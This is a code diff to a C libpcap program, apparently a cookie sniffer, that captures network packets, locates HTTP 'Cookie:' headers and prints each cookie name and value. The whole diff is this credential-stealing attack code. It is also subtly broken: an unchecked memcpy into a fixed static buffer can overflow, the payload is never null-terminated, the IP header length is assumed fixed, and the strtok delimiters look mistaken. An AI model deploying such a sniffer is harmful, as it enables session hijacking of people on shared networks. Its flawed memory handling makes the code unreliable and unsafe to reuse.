@@ -1,5 +1,8 @@
-#include <pcap.h>
+#include <pcap/pcap.h>
+#include <net/ethernet.h>
+#include <netinet/in.h>
 #include <stdlib.h>
+#include <string.h>
 
 #include "mypcap.h"
 #include "sniff_cookies_lib.h"
@@ -29,11 +32,54 @@ void signal_handler(int signal)
 */
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
-	if (!is_ip(header, packet))
+	Ether_hdr *eptr;
+	Ip_hdr *ip;
+	Tcp_hdr *tcp;
+	void *http_payload_addr;
+	char *http_cookies_addr;
+	char *pch;
+
+	u_short ether_type;
+	u_int tcp_header_size;
+	u_int http_payload_size;
+	static char http_payload[DEFAULT_TCP_PAYLOAD_SIZE];
+
+	eptr = (Ether_hdr *) packet;
+	ether_type = ntohs(eptr->ether_type);
+
+	/* If the packet doesn't use IP, we stop the function */
+	if (ether_type != ETHERTYPE_IP)
 		return;
 
-	if (!is_tcp(header, packet))
+	ip = (Ip_hdr *)(packet + sizeof(Ether_hdr));
+
+	/* If the packet doesn't use TCP, we stop the function */
+	if (ip->ip_type != IPPROTO_TCP)
 		return;
 
-	printf("[->] Got TCP/IP packet !\n");
+	tcp = (Tcp_hdr *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH);
+	tcp_header_size = 4 * tcp->tcp_offset;
+
+	http_payload_addr = (void *)(packet + ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);
+	http_payload_size = header->len - (ETHER_HDR_LENGTH + IP_HDR_LENGTH + tcp_header_size);
+
+	memcpy(http_payload, http_payload_addr, http_payload_size);
+
+	/* If the packet doesn't use HTTP, we stop the function */
+	if ((strstr(http_payload, " HTTP/")) == NULL)
+		return;
+
+	/* If the packet doesn't use HTTP cookies, we stop the function */
+	if ((http_cookies_addr = strstr(http_payload, "Cookie:")) == NULL)
+		return;
+
+	http_cookies_addr += 8;
+	http_cookies_addr = strtok(http_cookies_addr, "\r\t\r\t");
+	pch = strtok(http_cookies_addr, " =;");
+
+	while (pch != NULL)
+	{
+		printf("%s\n", pch);
+		pch = strtok(NULL, " =;");
+	}
 }
